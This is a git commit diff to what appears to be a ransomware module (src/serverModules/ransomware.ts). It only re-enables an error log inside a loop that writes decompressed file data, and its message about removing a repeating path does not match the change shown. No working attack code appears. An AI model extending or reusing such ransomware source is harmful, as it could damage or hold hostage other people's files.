aaeee7009d630a3e239f1acb831e9fb30f8287e4
stringmanolo <manuelvarelacaldas@gmail.com>
2022-04-26 17:34:54 +0200

    Remove repeating path from loadFile and saveFile

--- src/serverModules/ransomware.ts
+++ src/serverModules/ransomware.ts
@@ -271,7 +271,7 @@ console.log(`File writed in ${+new Date() - +oldTime} ms`);
         saveToFile(filesInPath[i], decompressedFileDataBuffer);
       }
     } catch(err) {
-      // console.log("Error loading file: " + err);
+      console.log("Error loading file: " + err);
       // silent error
     } 
 
